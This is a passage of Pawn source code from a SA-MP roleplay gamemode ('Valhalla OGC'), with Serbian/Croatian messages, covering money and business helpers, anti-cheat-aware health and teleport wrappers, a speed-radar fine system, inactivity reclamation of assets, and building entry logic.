	    OrgField3d[ id ] = CreateDynamic3DTextLabel( stringfield, -1, OI[ id ][ oDrugField ][ 0 ], OI[ id ][ oDrugField ][ 1 ], OI[ id ][ oDrugField ][ 2 ], 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0, -1, 50.0);
		OrgFieldPickup[ id ] = CreateDynamicPickup( 1239, 1, OI[ id ][ oDrugField ][ 0 ], OI[ id ][ oDrugField ][ 1 ], OI[ id ][ oDrugField ][ 2 ], 0, 0, -1, 50.0 );
	}
	if( OI[ id ][ oSafePos ][ 0 ] != 0 && OI[ id ][ oSafePos ][ 1 ] != 0 ) {
	    DestroyDynamicPickup( OrgSafePickup[ id ] );
    	DestroyDynamic3DTextLabel( OrgSafe3d[ id ] );
		new stringfield[ 128 ];
	    format( stringfield, sizeof( stringfield ), ""col_white"Sef za koriscenje /orgsef\nDa opljackate sef /opljackajsef\n"col_crvena"%s", OI[ id ][ oName ] );
	    OrgSafe3d[ id ] = CreateDynamic3DTextLabel( stringfield, -1, OI[ id ][ oSafePos ][ 0 ], OI[ id ][ oSafePos ][ 1 ], OI[ id ][ oSafePos ][ 2 ], 5, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, OI[ id ][ oVw ], OI[ id ][ oInt ], -1, 20.0);
		OrgSafePickup[ id ] = CreateDynamicPickup( 1239, 1, OI[ id ][ oSafePos ][ 0 ], OI[ id ][ oSafePos ][ 1 ], OI[ id ][ oSafePos ][ 2 ], OI[ id ][ oVw ], OI[ id ][ oInt ], -1, 20.0 );
	} 
	return true;
}
//------------------------------------------------------------------------------
stock Novi_SetPlayerHealth( playerid, Float:Zivot ) {

	if( Zivot < 0.0 ) {
		Zivot = 0.0;
	}
	if( Zivot > 150.0 ) {
		Zivot = 150.0;
	}

	SetPlayerHealth( playerid, Zivot );
	antiCheatCS[ playerid ][ TrueHealth ] = Zivot;
	return true;
}
stock DodajIgracuHP( playerid, value)
{
  new Float:Health; GetPlayerHealth( playerid, Health); Novi_SetPlayerHealth( playerid, Health+value);
}
//------------------------------------------------------------------------------
stock Novi_SetPlayerArmour( playerid, Float: armor ) {
	if( armor > 100.0 ) {
		armor = 100.0;
	}
	SetPlayerArmour( playerid, armor );
	antiCheatCS[ playerid ][ TrueArmour ] = armor;
	return true;
}
stock DodajIgracuArmour( playerid, value)
{
  new Float:Armour; GetPlayerArmour( playerid, Armour); Novi_SetPlayerArmour( playerid, Armour+value);
}
//------------------------------------------------------------------------------
PocetniNovac( playerid, novac ) {
	new Strg[ 15 ];
	if( novac > 0 ) {
	    format( Strg, sizeof( Strg ), "~g~$%d", novac );
	    GameTextForPlayer( playerid, Strg, 3000, 1 ); }
	else if( novac < 0 ) {
	    format( Strg, sizeof( Strg ), "~r~$%d", novac );
	    GameTextForPlayer( playerid, Strg, 3000, 1 ); }
	PlayerInfo[ playerid  ][ xNovac ] = novac;
	ResetujBarNovac( playerid );
	UpdejtujBarNovac( playerid, PlayerInfo[ playerid  ][ xNovac ] );
	return PlayerInfo[ playerid ][ xNovac ];

}
//------------------------------------------------------------------------------
stock BussinesMoney( bussinesID, ammount ) {
    if( bussinesID == -1 ) return 1;
	if( ammount < 0 || ammount > 99999999 ) return 1;
	BussinesInfo[ bussinesID ][ bMoney ] += ammount;
    SaveBussines( bussinesID );
	return 1;
}
//------------------------------------------------------------------------------
stock BussinesJobMoney( jobID, ammount ) {
	new bussinesID = -1;
    for (new i = 1; i < MAX_BUSSINES; i++ ) {
		if( BussinesInfo[ i ][ bType ] == VRSTA_POSAO ) {
		    if( BussinesInfo[ i ][ bJobID ] == jobID ) {
		        bussinesID = i;
		        break;
		    }
		}
	}
	if( bussinesID == -1 ) return 1;
	BussinesMoney( bussinesID, ammount );
	return 1;
}
stock BussinesRentMoney( playerid, ammount ) {
	new bussinesID = -1;
    for( new i = 1; i < MAX_BUSSINES; i++ ) {
        if( IsPlayerInRangeOfPoint( playerid, 100.0, BussinesInfo[ i ][ bEnterX ], BussinesInfo[ i ][ bEnterY ], BussinesInfo[ i ][ bEnterZ ] ) ) {
			if( BussinesInfo[ i ][ bType ] == VRSTA_RENT ) {
				bussinesID = i;
				break;
			}
		}
	}
	if( bussinesID == -1 ) return 1;
	BussinesMoney( bussinesID, ammount );
	return 1;
}
stock BussinesPumpaMoney( playerid, ammount ) {
	new bussinesID = -1;
    for( new i = 1; i < MAX_BUSSINES; i++ ) {
        if( IsPlayerInRangeOfPoint( playerid, 100.0, BussinesInfo[ i ][ bEnterX ], BussinesInfo[ i ][ bEnterY ], BussinesInfo[ i ][ bEnterZ ] ) ) {
			if( BussinesInfo[ i ][ bType ] == VRSTA_PUMPA ) {
				bussinesID = i;
				break;
			}
		}
	}
	if( bussinesID == -1 ) return 1;
	BussinesMoney( bussinesID, ammount );
	return 1;
}
stock BussinesJavnaKucaMoney( playerid, ammount ) {

	new bussinesID = -1;
	
    if( uFirmi[ playerid ] != -1 ) {
    
		if( BussinesInfo[ uFirmi[ playerid ] ][ bType ] == VRSTA_JAVNAK ) {
		
			bussinesID = uFirmi[ playerid ];
		}
	}
	
	if( bussinesID == -1 ) return 1;
	BussinesMoney( bussinesID, ammount );
	return 1;
}

DajIgracuNovacSpeech(playerid, novac) {

    PlayerInfo[ playerid ][ xNovac ] += novac;
    ResetujBarNovac( playerid );
    UpdejtujBarNovac( playerid, PlayerInfo[ playerid  ][ xNovac ] );
    SavePlayer( playerid );

    new string[22];
    if(novac < 0) {

        format(string,sizeof(string),"~r~$%d", novac);
    }
    else {

        format(string, sizeof(string), "~g~+$%d", novac);
    }

    PlayerTextDrawSetString(playerid, Novac_Info[playerid], string);
    PlayerTextDrawShow(playerid, Novac_Info[playerid]);

    defer SakrijNovacTimer(playerid);
    return 1;
}

DajIgracuNovac( playerid, novac ) {

    // if(novac < 0) {

    //     new procenat;
    //     if(PlayerInfo[playerid][xSkillSpeech] == 1) {

    //         novac -= (novac * 3) / 100;
    //         procenat = 3;
    //     }
    //     if(PlayerInfo[playerid][xSkillSpeech] == 2) {

    //         novac -= (novac * 5) / 100;
    //         procenat = 5;
    //     }
    //     if(PlayerInfo[playerid][xSkillSpeech] == 3) {

    //         novac -= (novac * 7) / 100;
    //         procenat = 7;
    //     }
    //     if(PlayerInfo[playerid][xSkillSpeech] == 4) {

    //         novac -= (novac * 10) / 100;
    //         procenat = 10;
    //     }
    //     if(PlayerInfo[playerid][xSkillSpeech] == 5) {

    //         novac -= (novac * 15) / 100;
    //         procenat = 15;
    //     }
    //     if(PlayerInfo[playerid][xSkillSpeech] != 0) SendSkillMessage(playerid, "Gubitak novca ti je smanjen zbog Speech Skill-a za %d posto!", procenat);
    // }
    // if(novac > 0) {

    //     new procenat;
    //     if(PlayerInfo[playerid][xSkillSpeech] == 1) {

    //         novac += (novac * 3) / 100;
    //         procenat = 3;
    //     }
    //     if(PlayerInfo[playerid][xSkillSpeech] == 2) {

    //         novac += (novac * 5) / 100;
    //         procenat = 5;
    //     }
    //     if(PlayerInfo[playerid][xSkillSpeech] == 3) {

    //         novac += (novac * 7) / 100;
    //         procenat = 7;
    //     }
    //     if(PlayerInfo[playerid][xSkillSpeech] == 4) {

    //         novac += (novac * 10) / 100;
    //         procenat = 10;
    //     }
    //     if(PlayerInfo[playerid][xSkillSpeech] == 5) {

    //         novac += (novac * 15) / 100;
    //         procenat = 15;
    //     }
    //     if(PlayerInfo[playerid][xSkillSpeech] != 0) SendSkillMessage(playerid, "Dobio si povecanje dobitka novca zbog Speech Skill-a za %d posto!", procenat);
    // }

	PlayerInfo[ playerid ][ xNovac ] += novac;
	ResetujBarNovac( playerid );
	UpdejtujBarNovac( playerid, PlayerInfo[ playerid  ][ xNovac ] );
	SavePlayer( playerid );

    new string[22];
    if(novac < 0) {

        format(string,sizeof(string),"~r~$%d", novac);
    }
    else {

        format(string, sizeof(string), "~g~+$%d", novac);
    }

    PlayerTextDrawSetString(playerid, Novac_Info[playerid], string);
    PlayerTextDrawShow(playerid, Novac_Info[playerid]);

    defer SakrijNovacTimer(playerid);
	return 1;

}

timer SakrijNovacTimer[3000](playerid) {

    PlayerTextDrawHide(playerid, Novac_Info[playerid]);

    return 1;
}
//------------------------------------------------------------------------------
stock ForbiddenWeap( playerid ) {
    new weap = GetPlayerWeapon(playerid);
    if( weap == 35 || weap == 36 || weap == 37 || weap == 38 || weap == 39 || weap == 40 || weap == 42 || weap == 44 || weap == 45) {
		return true;
    }
    return false;
}
//------------------------------------------------------------------------------
stock Korisnici( playerid ) {
    new string[ 128 ];
    format( string, sizeof( string ), I_FILE, ImeIgraca( playerid ) );
    return string;
}
//------------------------------------------------------------------------------
stock Admini( playerid ) {
    new string[ 128 ];
    format( string, sizeof( string ), A_FILE, ImeIgraca( playerid ) );
    return string;
}
stock KladIme( playerid ) {
    new string[ 64 ];
    format( string, sizeof( string ), KLAD_FILE, ImeIgraca( playerid ) );
    return string;
}
//------------------------------------------------------------------------------
IsValidRoleplayName(const name[]) {

	if(!name[0] || strfind(name, "_") == -1)
	    return 0;

	else for (new i = 0, len = strlen(name); i != len; i ++) {
	    if((i == 0) && (name[ i ] < 'A' || name[ i ] > 'Z'))
	        return 0;

		else if((i != 0 && i < len  && name[ i ] == '_') && (name[i + 1] < 'A' || name[i + 1] > 'Z'))
		    return 0;

		else if((name[ i ] < 'A' || name[ i ] > 'Z') && (name[ i ] < 'a' || name[ i ] > 'z') && name[ i ] != '_' && name[ i ] != '.')
		    return 0;
	}
	return 1;
}

//===============================[ Kraj ]=======================================
main() {
	print("Valhalla OGC - www.valhalla-ogc.com");
	print("V1.5.1 gamemode - Loading...");
	print("V1.5.1 gamemode - Loaded.");
	print("V1.5.1 gamemode by V01D");

    SetMaxConnections(2, e_FLOOD_ACTION_BAN);
}
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
//------------------------------------------------------------------------------
task BrziTajmer[100]()
{
	foreach( Player, i ) {
	
		new vehicleid = GetPlayerVehicleID( i );
		
		
		if( GetNearestRadar( i ) != -1 ) {
		
		    if( IsPlayerInAnyVehicle( i ) && GetPlayerState( i ) == PLAYER_STATE_DRIVER ) {
		    
		        if( !IsVehicleBajs( vehicleid  ) && !alreadyPictured[ i ] && GetSpeed( i ) > radarInfo[ GetNearestRadar( i ) ][ radarMaxSpeed ] ) {
		        
		            if( !PoliceDuty[ i ] && !AdminDuty[ i ] ) {
		            
		                PlayerInfo[ i ][ xRadarBodovi ]++;
		                
			            alreadyPictured[ i ] = true;
			            SetTimerEx( "RemoveRadarPictured", 10000, false, "i", i );
			            GameTextForPlayer( i, "~w~RADAR VAS JE USLIKAO", 2000, 5 );
			            SCM( i, -1, ""col_crvena"___________________________"col_white"RADAR"col_crvena"___________________________" );
			            SendClientMessageEx( i, -1, "Prekoracili ste maksimalnu brzinu od "col_crvena"%d.", radarInfo[ GetNearestRadar( i ) ][ radarMaxSpeed ] );
			            SendClientMessageEx( i, -1, "Radar vas je uslikao, kazna je "col_crvena"%d$.", radarInfo[ GetNearestRadar( i ) ][ radarPrice ] );

						if( PlayerInfo[ i ][ xRadarBodovi ] == 3 ||
			                PlayerInfo[ i ][ xRadarBodovi ] == 6 ||
			                PlayerInfo[ i ][ xRadarBodovi ] == 9 ||
			                PlayerInfo[ i ][ xRadarBodovi ] == 12 ||
							PlayerInfo[ i ][ xRadarBodovi ] == 15 ) {

                            SendClientMessageEx( i, -1, "Oduzeto vam je "col_crvena"2000$"col_white", zbog "col_crvena"%d "col_white"neplacenih radar poena.", PlayerInfo[ i ][ xRadarBodovi ] );
							DajIgracuNovac( i, -2000 );
		                }
		                else if( PlayerInfo[ i ][ xRadarBodovi ] >= 18 ) {
		                
		                    if( PlayerInfo[ i ][ xVozacka ] != 0 ) {
		                    
		                    	PlayerInfo[ i ][ xVozacka ] = 0;
		                    	SCM( i, -1, "Oduzeta vam je vozacka dozvola zbog "col_crvena"18 "col_white"neplacenih radar poena." );
							}
		                }
		                SCM( i, -1, ""col_crvena"_____________________________________________________________" );
						RadarColor( i );
						if(PlayerInfo[i][xWanted] > 0) 
						{
							new string[128];
							format( string, sizeof( string ), "* Radar je identifikovao osumnjicenog %s.Koristi /dosije i /lociraj!", ImeIgraca( i ) );
							if( IsPlayerConnected( i ) ) {
								if( OI[ PlayerInfo[ i ][ xClan ] ][ oTip ] == ORG_TIP_PD ) {
									SCM( i, 0x8D8DFF00, string );
								}
							}
						}
					}
		        }
		    }
		}
	
		if( PosaoTDShowed[ i ] == true || BuyCarTDShowed[ i ] == true ) {
		    SelectTextDraw( i, SRVBOJA1 );
		}
    }
	return 1;
}
//------------------------------------------------------------------------------

//------------------------------------------------------------------------------

forward neaktivnostFirmi( b );
public neaktivnostFirmi( b ) {

		
	new fFile[ 50 ];
    format( fFile, sizeof( fFile ), F_FILE, b );

    if( fexist( fFile ) ) {
	    
		if( BussinesInfo[ b ][ bOwned ] == 1 ) {

			BussinesInfo[ b ][ bNeaktivnost ]++;
			if( BussinesInfo[ b ][ bNeaktivnost ] >= 500 ) {
				
				new string[ 256 ];

				format( string, sizeof( string ), "FirmaID: %d | Prodana zbog neaktivnosti vlasnika %s ", b, BussinesInfo[ b ][ bOwner ] );
				LogSave( "Ostalo/LogNeaktivnost.log", string );

			    BussinesInfo[ b ][ bOwned ] = 0;
			    BussinesInfo[ b ][ bNeaktivnost ] = 0;
	    		strmid( BussinesInfo[ b ][ bOwner ], "Drzava", 0, strlen( "Drzava" ), 32);
				Bussines_Refresh( b );
				
			}
			SaveBussines( b );
			Bussines_Refresh( b );
		}
	}
		
	if( b+1 < MAX_BUSSINES ) SetTimerEx( "neaktivnostFirmi", 10, false, "d", b+1 );
	return 1;
}

forward neaktivnostImovine( i );
public neaktivnostImovine( i ) {


	new iFile[ 50 ];
    format( iFile, sizeof( iFile ), IM_FILE, i );

	if( fexist( iFile ) ) {

		if( II[ i ][ iOwned ] == 1 ) {

			II[ i ][ iNeaktivnost ]++;
			if( II[ i ][ iNeaktivnost ] >= 500 ) {

			    new string[ 256 ];

				format( string, sizeof( string ), "ImovinaID: %d | Prodana zbog neaktivnosti vlasnika %s.", i, II[ i ][ iOwner ] );
				LogSave( "Ostalo/LogNeaktivnost.log", string );

			    II[ i ][ iOwned ] = 0;
			    II[ i ][ iNeaktivnost ] = 0;
				strmid( II[ i ][ iOwner], "Drzava", 0, strlen( "Drzava" ), 32);
				PropertyRefresh( i );
					
			}
			SaveProperty( i );
			PropertyRefresh( i );
		}
	}
	
	if( i+1 < MAX_IMOVINA ) SetTimerEx( "neaktivnostImovine", 10, false, "d", i+1 );
    return 1;
}

forward neaktivnostVozila( c );
public neaktivnostVozila( c ) {


	new vFile[ 50 ];
    format( vFile, sizeof( vFile ), V_FILE, c );

	if( fexist( vFile ) ) {

		if( VehicleInfo[ c ][ vUsage ] == PRIVATNO_VOZILO && VehicleInfo[ c ][ vOwned ] == 1 ) {

			VehicleInfo[ c ][ vNeaktivnost ]++;
			if( VehicleInfo[ c ][ vNeaktivnost ] >= 500 ) {

				VehicleInfo[ c ][ vVirtualWorld ] = 0;
				VehicleInfo[ c ][ vInterior ] = 0;

				VehicleInfo[ c ][ vOwned ] = 0;
				VehicleInfo[ c ][ vNeaktivnost ] = 0;
				VehicleInfo[ c ][ vPrice ] = -1;

                Novi_DestroyVehicle( VehicleInfo[ c ][ vID ] );
                ResetVehicle( c );
                ObrisiVozilo( c );

		    }
		    SaveVehicle( c );
		}
	}
	
	if( c+1 < MAX_CARS ) SetTimerEx( "neaktivnostVozila", 10, false, "d", c+1 );
    return 1;
}

task NeaktivnostDodavanje[3600000]()
{

    SetTimerEx( "neaktivnostFirmi", 10, false, "d", 0 );

    SetTimerEx( "neaktivnostImovine", 15000, false, "d", 0 );

    SetTimerEx( "neaktivnostVozila", 80000, false, "d", 0 );

    return 1;
}
//------------------------------------------------------------------------------
task Spectator[3030]()
{
	foreach( Player, i ) {
	    if( Spectate[ i ] > -1 && Spectate[ i ] < 500 ) {
			new targetid = Spectate[ i ];
			if( IsPlayerConnected( targetid ) ) {
				TogglePlayerSpectating( i, true );
				if( PlayerInfo[ i ][ xAdmin ] >= 1 || PlayerInfo[ i ][ xSupporter ] >= 2 ) {
				    new Float:health, specstring[ 180 ];
					GetPlayerHealth( targetid, health );
				    if( IsPlayerInAnyVehicle( targetid ) ) {
				        new Float:X, Float:Y, Float:Z;
						new carid = GetPlayerVehicleID( targetid );
					    PlayerSpectateVehicle( i, carid );
	            	    GetVehicleVelocity( carid, X, Y, Z );
	            	    new Float:Speed = floatmul( floatsqroot( floatadd( floatadd( floatpower( X, 2 ), floatpower( Y, 2 ) ),  floatpower( Z, 2 ) ) ), 130.0 );
                        format( specstring, sizeof( specstring ), "~y~ID: ~w~%d ~n~~y~Ime: ~w~%s ~n~~y~Novac: ~w~%d$ ~n~~y~Health: ~w~%1.f ~n~~y~Brzina: ~w~%i~n~~y~Oruzje: ~w~%s(%d m)", targetid, ImeIgraca( targetid ), PlayerInfo[ targetid ][ xNovac ], health, floatround(Speed, floatround_floor ), WeaponInfos[ GetPlayerWeapon( targetid ) ][ wName ], GetPlayerAmmo( targetid ) );
						PlayerTextDrawSetString( i, SpecTextDraw[ i ], specstring );
					}
				   	else {
						PlayerSpectatePlayer( i, targetid );
					    format( specstring, sizeof( specstring ), "~y~ID: ~w~%d ~n~~y~Ime: ~w~%s ~n~~y~Novac: ~w~%d$ ~n~~y~Health: ~w~%1.f~n~~y~Oruzje: ~w~%s(%d m)", targetid, ImeIgraca( targetid ), PlayerInfo[ targetid ][ xNovac ], health, WeaponInfos[ GetPlayerWeapon( targetid ) ][ wName ], GetPlayerAmmo( targetid ) );
						PlayerTextDrawSetString( i, SpecTextDraw[ i ], specstring );
					}
					SetPlayerInterior( i, GetPlayerInterior( targetid ) );
				    SetPlayerVirtualWorld( i, GetPlayerVirtualWorld( targetid ) );
				}
			}
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
forward StopSearchNadji( playerid );
public StopSearchNadji( playerid ) {
    SearchNadji[ playerid ] = IPI;
    return true;
}
//------------------------------------------------------------------------------
forward Pitanje( playerid );
public Pitanje( playerid ) {
	if( PlayerInfo[ playerid ][ xRPLearn ] == 1 ) {
	    Novi_KillTimer( TimerPitanje[ playerid ] );
	    Novi_Kick( playerid );
	}
	else {
	    Novi_KillTimer( TimerPitanje[ playerid ] );
	}
	return true;

}
//------------------------------------------------------------------------------
forward KrajRenta( playerid, vehicleid );
public KrajRenta( playerid, vehicleid ) {
	VehicleObjectCheck( vehicleid );
    SetVehicleToRespawn( vehicleid );
    LinkVehicleToInterior( vehicleid, 0 );
    if( Rentano[ playerid ] == vehicleid ) {
		Rentano[ playerid ] = -1;
		Novi_KillTimer( RentTimer[ playerid ] );
	}
	SCM( playerid, ZUTA, "Isteklo je 10 minuta za rentano vozilo te je vraceno.");
	return true;
}
//------------------------------------------------------------------------------
// anticheat
forward Novi_SetPlayerPos( playerid, Float:x, Float:y, Float:z );
public Novi_SetPlayerPos( playerid, Float:x, Float:y, Float:z ) {
    SetPlayerPos( playerid, x, y, z );
    antiCheatCS[ playerid ][ TeleportPos ][ 0 ] = x;
	antiCheatCS[ playerid ][ TeleportPos ][ 1 ] = y;
	antiCheatCS[ playerid ][ TeleportPos ][ 2 ] = z;
	antiCheatCS[ playerid ][ TeleportCheck ] = 4;
    antiCheatCS[ playerid ][ EnterVehTime ] -= 221;
	return true;
}

forward Novi_SetSpawnInfo( playerid );
public Novi_SetSpawnInfo( playerid ) {
	new rand;

	if( playerid % 2 == 0 ) {
		rand = random( sizeof( RandomLSSpawn1 ) );
		antiCheatCS[ playerid ][ TeleportPos ][ 0 ] = RandomLSSpawn1[ rand ][ 0 ];
		antiCheatCS[ playerid ][ TeleportPos ][ 1 ] = RandomLSSpawn1[ rand ][ 1 ];
		antiCheatCS[ playerid ][ TeleportPos ][ 2 ] = RandomLSSpawn1[ rand ][ 2 ];
		SetSpawnInfo( playerid, 0, PlayerInfo[ playerid ][ xSkin ], RandomLSSpawn1[ rand ][ 0 ], RandomLSSpawn1[ rand ][ 1 ], RandomLSSpawn1[ rand ][ 2 ], 360.00, 0, 0, 0, 0, 0, 0 );
	}
	else {
		rand = random( sizeof( RandomLSSpawn2 ) );
		antiCheatCS[ playerid ][ TeleportPos ][ 0 ] = RandomLSSpawn2[ rand ][ 0 ];
		antiCheatCS[ playerid ][ TeleportPos ][ 1 ] = RandomLSSpawn2[ rand ][ 1 ];
		antiCheatCS[ playerid ][ TeleportPos ][ 2 ] = RandomLSSpawn2[ rand ][ 2 ];
		SetSpawnInfo( playerid, 0, PlayerInfo[ playerid ][ xSkin ], RandomLSSpawn2[ rand ][ 0 ], RandomLSSpawn2[ rand ][ 1 ], RandomLSSpawn2[ rand ][ 2 ], 360.00, 0, 0, 0, 0, 0, 0 );
	}
	antiCheatCS[ playerid ][ TeleportCheck ] = 4;
	return true;
}

stock Novi_AttachTrailerToVehicle( trailerid, vehicleid ) {
	LastPullingVehicle[ trailerid ] = vehicleid;
	return AttachTrailerToVehicle( trailerid, vehicleid );
}

forward Novi_SetVehiclePos( vehicleid, Float:x, Float:y, Float:z );
public Novi_SetVehiclePos( vehicleid, Float:x, Float:y, Float:z ) {
	if( vehicleid != INVALID_VEHICLE_ID ) {
	    if( SetVehiclePos( vehicleid, x, y, z ) ) {
	        RealVehiclePositions[ vehicleid ][ 0 ] = x;
			RealVehiclePositions[ vehicleid ][ 1 ] = y;
			RealVehiclePositions[ vehicleid ][ 2 ] = z;
            foreach( Player, i ) {
			    if( GetPlayerVehicleID( i ) == vehicleid ) {
			        antiCheatCS[ i ][ TeleportPos ][ 0 ] = x;
					antiCheatCS[ i ][ TeleportPos ][ 1 ] = y;
					antiCheatCS[ i ][ TeleportPos ][ 2 ] = z;
					antiCheatCS[ i ][ TeleportCheck ] = 4;
  			        antiCheatCS[ i ][ EnterVehTime ] -= 221;
			    }
			}
			return 1;
		}
	}
	return 1;
}

stock Novi_PutPlayerInVehicle( playerid, vehicleid, seatid ) {

	antiCheatCS[ playerid ][ EnteredVehicle ] = vehicleid;
	antiCheatCS[ playerid ][ EnterVehTime ] -= 221;
    if(seatid == 0) {
        occupied[ vehicleid ] = true;
    }
	PutPlayerInVehicle( playerid, vehicleid, seatid );
}

stock Novi_RemovePlayerFromVehicle( playerid ) {

	antiCheatCS[ playerid ][ RemoveVehicle ] = true;
    antiCheatCS[ playerid ][ EnteredVehicle ] = INVALID_VEHICLE_ID;
	antiCheatCS[ playerid ][ EnterVehTime ] -= 221;
	return RemovePlayerFromVehicle( playerid );
}
//------------------------------------------------------------------------------
public UlazIzlaz( playerid ) {
    antiCheatCS[ playerid ][ TeleportCheck ] = 4;

    for( new i = 1; i < MAX_WORKSHOPS; i++) {
    
        if( IsPlayerInRangeOfPoint( playerid, 2.0, WorkShopInfo[ i ][ wPosX ], WorkShopInfo[ i ][ wPosY ], WorkShopInfo[ i ][ wPosZ ] ) ) {

            if(strcmp( WorkShopInfo[i][wVlasnik], "Niko", true )) {
            
                FadeFromBlack( playerid );

                Novi_SetPlayerPos( playerid, 1381.4818,-43.0187,1001.0511);
                GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
                SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
                SetCameraBehindPlayer( playerid );
                TogglePlayerControllable( playerid, false );
                SetPlayerInterior( playerid, 0);
                SetPlayerVirtualWorld( playerid, i);
            }
            else return GameTextForPlayer( playerid, "~r~Nema Vlasnika", 5000, 6 );
        }
        else if( IsPlayerInRangeOfPoint( playerid, 2.0, 1381.4818,-43.0187,1001.0511) && GetPlayerVirtualWorld( playerid ) == i) {

            FadeFromBlack( playerid );

            Novi_SetPlayerPos( playerid, WorkShopInfo[ i ][ wPosX ], WorkShopInfo[ i ][ wPosY ], WorkShopInfo[ i ][ wPosZ ]);
            GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
            SetTimerEx("SlobodnoSada", 6000, false, "i", playerid );
            SetCameraBehindPlayer( playerid );
            TogglePlayerControllable( playerid, 0 );
            SetPlayerInterior( playerid, 0 );
            SetPlayerVirtualWorld( playerid, 0 );
        }
    }

    for( new i = 1; i < MAX_BTCW; i++) {
    
        if( IsPlayerInRangeOfPoint( playerid, 2.0, BitcoinInfo[ i ][ bUlazX ], BitcoinInfo[ i ][ bUlazY ], BitcoinInfo[ i ][ bUlazZ ] ) ) {

            if(strcmp( BitcoinInfo[i][bVlasnik], "Niko", true )) {
            
                FadeFromBlack( playerid );

                Novi_SetPlayerPos( playerid, BitcoinInfo[ i ][ bIzlazX ], BitcoinInfo[ i ][ bIzlazY ], BitcoinInfo[ i ][ bIzlazZ ]);
                GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
                SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
                SetCameraBehindPlayer( playerid );
                TogglePlayerControllable( playerid, false );
                SetPlayerInterior( playerid, 0);
                SetPlayerVirtualWorld( playerid, i);
            }
            else return GameTextForPlayer( playerid, "~r~Nema Vlasnika", 5000, 6 );
        }
        else if( IsPlayerInRangeOfPoint( playerid, 2.0, BitcoinInfo[ i ][ bIzlazX ], BitcoinInfo[ i ][ bIzlazY ], BitcoinInfo[ i ][ bIzlazZ ]) && GetPlayerVirtualWorld( playerid ) == i) {

            FadeFromBlack( playerid );

            PortajIgraca( playerid, BitcoinInfo[ i ][ bUlazX ], BitcoinInfo[ i ][ bUlazY ], BitcoinInfo[ i ][ bUlazZ ]);
            GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
            SetTimerEx("SlobodnoSada", 6000, false, "i", playerid );
            SetCameraBehindPlayer( playerid );
            TogglePlayerControllable( playerid, 0 );
            SetPlayerInterior( playerid, 0 );
            SetPlayerVirtualWorld( playerid, 0 );
        }
    }

	for( new i= 1; i < MAX_ORG; i++) {

		if( IsPlayerInRangeOfPoint( playerid, 2.0, OI[ i ][ oPozExtX ], OI[ i ][ oPozExtY ], OI[ i ][ oPozExtZ ] ) ) {

			if( OI[ i ][ oTip ] == ORG_TIP_PD || OI[ i ][ oTip ] == ORG_TIP_CNN || OI[ i ][ oTip ] == ORG_TIP_MD || OI[ i ][ oTip ] == ORG_TIP_TAXI ) {

                FadeFromBlack( playerid );
                
				Novi_SetPlayerPos( playerid, OI[ i ][ oPozIntX ], OI[ i ][ oPozIntY ], OI[ i ][ oPozIntZ ] );
			  	GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
			    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
			   	SetCameraBehindPlayer( playerid );
			    TogglePlayerControllable( playerid, false );
			   	SetPlayerInterior( playerid, OI[ i ][ oInt ] );
				SetPlayerVirtualWorld( playerid, OI[ i ][ oVw ] );
				inOrgInt[ playerid ] = i;
			}
			else {
			
				if( PlayerInfo[ playerid ][ xClan ] == i || PlayerInfo[ playerid ][ xAdmin ] >= 6 ) {

                    FadeFromBlack( playerid );

					Novi_SetPlayerPos( playerid, OI[ i ][ oPozIntX ], OI[ i ][ oPozIntY ], OI[ i ][ oPozIntZ ] );
			  		GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
				    SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
				    SetCameraBehindPlayer( playerid );
			        TogglePlayerControllable( playerid, false );
			    	SetPlayerInterior( playerid, OI[ i ][ oInt ] );
					SetPlayerVirtualWorld( playerid, OI[ i ][ oVw ] );
					inOrgInt[ playerid ] = i;
				}
				else return GameTextForPlayer( playerid, "~r~Zakljucano", 5000, 6 );
			}
		}
		else if( IsPlayerInRangeOfPoint( playerid, 2.0, OI[ i ][ oPozIntX ], OI[ i ][ oPozIntY ], OI[ i ][ oPozIntZ ] ) && GetPlayerVirtualWorld( playerid ) == OI[ i ][ oVw ] ) {

            FadeFromBlack( playerid );

		    PortajIgraca( playerid, OI[ i ][ oPozExtX ], OI[ i ][ oPozExtY ], OI[ i ][ oPozExtZ ] );
		    GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
		    SetTimerEx("SlobodnoSada", 6000, false, "i", playerid );
	        SetCameraBehindPlayer( playerid );
	        TogglePlayerControllable( playerid, 0);
			SetPlayerInterior( playerid, 0);
			SetPlayerVirtualWorld( playerid, 0);
			inOrgInt[ playerid ] = -1;
		}

        else if(IsPlayerInRangeOfPoint(playerid, 2.0, OI[i][oSlabaTacka][0], OI[i][oSlabaTacka][1], OI[i][oSlabaTacka][2])) {

            if(!OI[i][oSlabaTackaProbijena]) return SendErrorMessage(playerid, "Slaba tacka nije probijena! /probijslabutacku");

            FadeFromBlack( playerid );
                
            Novi_SetPlayerPos( playerid, OI[ i ][ oPozIntX ], OI[ i ][ oPozIntY ], OI[ i ][ oPozIntZ ] );
            GameTextForPlayer( playerid, "Ucitavanje ...", 6000, 4 );
            SetTimerEx( "SlobodnoSada", 6000, false, "i", playerid );
            SetCameraBehindPlayer( playerid );
            TogglePlayerControllable( playerid, false );
            SetPlayerInterior( playerid, OI[ i ][ oInt ] );
            SetPlayerVirtualWorld( playerid, OI[ i ][ oVw ] );
            inOrgInt[ playerid ] = i;
        }
	}
	for( new i = 1; i < MAX_ORG; i++ ) {
		for( new id = 0; id < OI[ i ][ oMaxPort ]; id++ ) {
		    if( PlayerInfo[ playerid ][ xClan ] == i ) {
